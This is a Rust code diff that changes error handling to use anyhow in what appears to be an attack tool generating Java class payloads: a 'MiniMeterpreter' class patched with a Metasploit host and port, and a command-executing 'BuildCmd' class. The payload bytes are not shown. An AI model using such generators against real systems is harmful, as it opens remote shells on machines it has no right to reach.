@@ -1,7 +1,9 @@
 use std::fs::File;
-use std::error::Error;
 use std::io::prelude::*;
 use std::path::Path;
+
+use anyhow::Context;
+use anyhow;
 
 use crate::common::BuildCmdCfg;
 
@@ -51,18 +53,18 @@ fn replace_byte_seq(buf : &[ u8 ], replacements : &Vec<StrReplacement>)->Vec<u8>
     result
 }
 
-pub fn ensure_mm_class_exists(base_dir : &str, class_name : &str, msf_ip : &str, msf_port : &str) -> Result<(), Box<dyn Error>>{
+pub fn _ensure_mm_class_exists(base_dir : &str, class_name : &str, msf_ip : &str, msf_port : &str) -> Result<(), anyhow::Error>{
     let class_path= Path::new(&base_dir).join(format!("{}.class", &class_name));
     if !class_path.exists() {
-        let the_class =  build_mm_class(class_name, msf_ip, msf_port)?;
-        let mut file = File::create(&class_path)?;
-        file.write(&the_class)?;
-        file.flush()?;
+        let the_class =  build_mm_class(class_name, msf_ip, msf_port);
+        let mut file = File::create(&class_path).context("Error creating MM file")?;
+        file.write(&the_class).context("Error writing to MM file")?;
+        file.flush().context("Error flushing MM file")?;
     }
     Ok(())
 }
 
-pub fn build_mm_class(class_name : &str, msf_host : &str, msf_port : &str) -> Result<Vec<u8>, Box<dyn Error>>{
+pub fn build_mm_class(class_name : &str, msf_host : &str, msf_port : &str) -> Vec<u8> {
     let replacements = vec![
         StrReplacement::new("MiniMeterpreter", &class_name),
         StrReplacement::new("MiniMeterpreter.java", &format!("{}.java", &class_name)),
@@ -71,19 +73,19 @@ pub fn build_mm_class(class_name : &str, msf_host : &str, msf_port : &str) -> Re
     ];
 
     let the_class = replace_byte_seq(&MM_CLASS, &replacements);
-    Ok(the_class)
+    the_class
 }
 
-pub fn build_and_save_cmd_class(build_path : String, cfg : BuildCmdCfg) -> Result<(), Box<dyn Error>>{
+pub fn build_and_save_cmd_class(build_path : String, cfg : BuildCmdCfg) -> Result<(), anyhow::Error>{
     let class_path= Path::new(&build_path).join(format!("{}.class", &cfg.class_name));
-    let the_class = build_cmd_class(cfg)?;
-    let mut file = File::create(&class_path)?;
-    file.write(&the_class)?;
-    file.flush()?;
+    let the_class = build_cmd_class(cfg);
+    let mut file = File::create(&class_path).context("Error creating cmd class file")?;
+    file.write(&the_class).context("Error writing cmd class file")?;
+    file.flush().context("Error flusing cmd lclass file")?;
     Ok(())
 }
 
-pub fn build_cmd_class(cfg : BuildCmdCfg) -> Result<Vec<u8>, Box<dyn Error>>{
+pub fn build_cmd_class(cfg : BuildCmdCfg) -> Vec<u8> {
     let replacements = vec![
         StrReplacement::new("BuildCmd", &cfg.class_name),
         StrReplacement::new("BuildCmd.java", &format!("{}.java", &cfg.class_name)),
@@ -92,5 +94,5 @@ pub fn build_cmd_class(cfg : BuildCmdCfg) -> Result<Vec<u8>, Box<dyn Error>>{
     ];
 
     let the_class = replace_byte_seq(&CMD_CLASS, &replacements);
-    Ok(the_class)
+    the_class
 }
